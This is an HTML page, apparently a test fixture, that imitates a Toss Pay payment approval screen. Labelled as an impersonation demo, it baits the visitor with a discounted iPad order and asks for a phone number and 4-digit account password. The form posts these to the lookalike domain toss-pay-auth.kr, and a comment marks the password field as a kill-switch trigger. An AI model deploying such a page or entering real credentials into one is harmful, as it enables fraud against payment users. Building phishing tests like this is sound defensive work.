<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>토스페이(Toss Pay) - 간편결제 승인 [사칭 데모 페이지]</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #f0f4f8;
      margin: 0;
      padding: 40px 20px;
      display: flex;
      justify-content: center;
    }
    .toss-card {
      background: #ffffff;
      width: 100%;
      max-width: 440px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
      padding: 36px 28px;
      text-align: center;
      box-sizing: border-box;
    }
    .logo {
      font-size: 28px;
      font-weight: 800;
      color: #3182f6;
      margin-bottom: 8px;
    }
    .amount {
      font-size: 32px;
      font-weight: 800;
      color: #191f28;
      margin: 16px 0 24px 0;
    }
    .desc {
      font-size: 15px;
      color: #4e5968;
      line-height: 1.5;
      margin-bottom: 30px;
    }
    .input-box {
      margin-bottom: 24px;
      text-align: left;
    }
    .input-box label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #6b7684;
      margin-bottom: 8px;
    }
    .input-box input {
      width: 100%;
      padding: 14px;
      border: 1px solid #e5e8eb;
      border-radius: 12px;
      font-size: 16px;
      box-sizing: border-box;
      background: #f9fafb;
    }
    .btn-pay {
      width: 100%;
      background: #3182f6;
      color: white;
      border: none;
      padding: 18px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 14px;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn-pay:hover {
      background: #1b64da;
    }
  </style>
</head>
<body>
  <div class="toss-card">
    <div class="logo">toss pay</div>
    <div class="amount">489,000원</div>
    <div class="desc">
      <strong>[특가 결제 승인]</strong><br/>
      애플 아이패드 프로 11인치 특가 주문 결제를 위해 결제 비밀번호를 입력해주세요.
    </div>

    <!-- 모의 피싱 폼 -->
    <form action="http://toss-pay-auth.kr/receive" method="POST">
      <div class="input-box">
        <label>토스 결제 휴대폰 번호</label>
        <input type="tel" placeholder="010-0000-0000" />
      </div>

      <!-- 🚨 Kill-Switch 트리거: 계좌 비밀번호 또는 카드 비밀번호 -->
      <div class="input-box">
        <label>계좌 비밀번호 4자리</label>
        <input type="password" placeholder="비밀번호 4자리 입력" required />
      </div>

      <button type="submit" class="btn-pay">489,000원 결제하기</button>
    </form>
  </div>
</body>
</html>
